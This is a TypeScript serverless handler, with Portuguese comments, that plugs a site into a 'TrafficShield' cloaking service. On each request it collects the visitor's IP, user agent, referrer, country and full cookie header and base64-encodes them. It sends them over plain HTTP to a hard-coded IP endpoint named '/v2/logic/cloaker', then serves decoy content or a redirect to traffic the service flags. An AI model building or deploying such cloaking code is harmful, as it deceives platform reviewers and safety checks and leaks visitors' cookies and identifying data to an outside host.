import type { VercelRequest, VercelResponse } from '@vercel/node';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // Verificar parâmetro de teste
  if (req.query['TS-BHDNR-84848']) {
    return res.status(200).send('c52f729355');
  }

  try {
    // Coletar headers da requisição (equivalente ao get_header() do PHP)
    const headers: Record<string, any> = {
      // Headers principais do TrafficShield
      'TS-BHDNR-74191': '900661405756137',
      'TS-BHDNR-74194': 'c52f729355',
      
      // Informações da requisição
      REMOTE_ADDR: req.socket.remoteAddress || req.headers['x-forwarded-for'] || req.headers['x-real-ip'],
      REQUEST_URI: req.url || '/',
      HTTP_HOST: req.headers.host,
      HTTP_USER_AGENT: req.headers['user-agent'],
      HTTP_ACCEPT: req.headers.accept,
      HTTP_ACCEPT_LANGUAGE: req.headers['accept-language'],
      HTTP_ACCEPT_ENCODING: req.headers['accept-encoding'],
      HTTP_REFERER: req.headers.referer || req.headers.referrer,
      HTTP_CONNECTION: req.headers.connection,
      HTTP_CACHE_CONTROL: req.headers['cache-control'],
      
      // Headers adicionais
      REQUEST_METHOD: req.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: new URL(req.url || '/', `http://${req.headers.host}`).search.substring(1),
      
      // Headers de proxy (importantes para detectar tráfego)
      HTTP_X_FORWARDED_FOR: req.headers['x-forwarded-for'],
      HTTP_X_FORWARDED_PROTO: req.headers['x-forwarded-proto'],
      HTTP_X_REAL_IP: req.headers['x-real-ip'],
      HTTP_CF_CONNECTING_IP: req.headers['cf-connecting-ip'],
      HTTP_CF_IPCOUNTRY: req.headers['cf-ipcountry'],
      
      // Cookies
      HTTP_COOKIE: req.headers.cookie,
    };

    // Fazer POST para API TrafficShield
    const trafficShieldResponse = await fetch('http://198.211.101.164/v2/logic/cloaker', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `headers=${Buffer.from(JSON.stringify(headers)).toString('base64')}`
    });

    const result = await trafficShieldResponse.json();

    // Processar resposta do TrafficShield
    if (result.zrc) {
      // Tráfego bloqueado - retornar conteúdo alternativo
      const content = Buffer.from(result.zrc, 'base64').toString('utf-8');
      return res.status(200).json({
        allowed: false,
        type: 'content',
        content: content
      });
    } else if (result.url) {
      // Tráfego bloqueado - retornar URL para redirecionamento
      return res.status(200).json({
        allowed: false,
        type: 'redirect',
        url: result.url,
        code: result.http_code || 302
      });
    } else {
      // Tráfego aprovado
      return res.status(200).json({
        allowed: true
      });
    }
  } catch (error) {
    console.error('TrafficShield verification error:', error);
    
    // Em caso de erro, permitir acesso (fail-safe)
    return res.status(200).json({
      allowed: true,
      error: 'Verification failed, allowing access'
    });
  }
}
